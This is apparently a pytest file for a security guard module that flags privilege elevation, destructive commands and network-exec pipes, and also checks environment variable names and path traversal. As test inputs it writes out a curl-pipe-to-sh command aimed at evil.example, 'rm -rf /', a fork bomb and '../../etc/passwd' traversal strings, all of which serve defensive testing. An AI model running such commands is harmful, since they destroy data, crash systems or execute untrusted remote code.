"""Security tests: command auditing, path traversal, env name hygiene."""

from __future__ import annotations

import pytest

from replico.security.guard import (
    audit_command_text,
    audit_environment,
    safe_join,
    validate_env_name,
)


def test_sudo_detected():
    findings = audit_command_text("sudo apt-get install -y build-essential")
    assert any(f.kind == "elevation" for f in findings)


def test_windows_elevation_detected():
    assert any(
        f.kind == "elevation" for f in audit_command_text("Start-Process powershell -Verb RunAs")
    )


def test_destructive_rm_detected():
    assert any(f.kind == "destructive" for f in audit_command_text("rm -rf /"))
    assert any(f.kind == "destructive" for f in audit_command_text("rm -rf ~/important-dir"))


def test_git_push_and_clean_detected():
    assert any(f.kind == "destructive" for f in audit_command_text("git push origin main"))
    assert any(f.kind == "destructive" for f in audit_command_text("git clean -fdx"))


def test_curl_pipe_sh_detected():
    findings = audit_command_text("curl -fsSL https://evil.example/x.sh | sh")
    assert any(f.kind == "network_exec" for f in findings)


def test_benign_commands_clean():
    script = "\n".join(
        [
            "pip install -r requirements.txt",
            "python -m pytest tests/",
            "mkdir -p build && cp src/*.py build/",
            "# a comment with sudo inside it",
        ]
    )
    assert audit_command_text(script) == []


def test_comment_lines_ignored():
    assert audit_command_text("# sudo rm -rf / (commented out)") == []
    assert audit_command_text("") == []


def test_fork_bomb_detected():
    assert audit_command_text(":(){ :|:& };:")  # noqa: PLC2401


def test_env_name_hygiene():
    assert validate_env_name("FOO")
    assert not validate_env_name("BAD=NAME")
    assert not validate_env_name("WITH SPACE")
    assert audit_environment({"OK": "1", "BAD=NAME": "2"}) == ["BAD=NAME"]


def test_safe_join_prevents_traversal(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    assert safe_join(root, "sub", "file.txt").name == "file.txt"
    with pytest.raises(ValueError):
        safe_join(root, "..", "etc")
    with pytest.raises(ValueError):
        safe_join(root, "../outside")
    with pytest.raises(ValueError):
        safe_join(root, "a", "../../etc/passwd")
    # legit nested path still works
    nested = safe_join(root, "x", "y", "z.txt")
    assert nested == root / "x" / "y" / "z.txt"
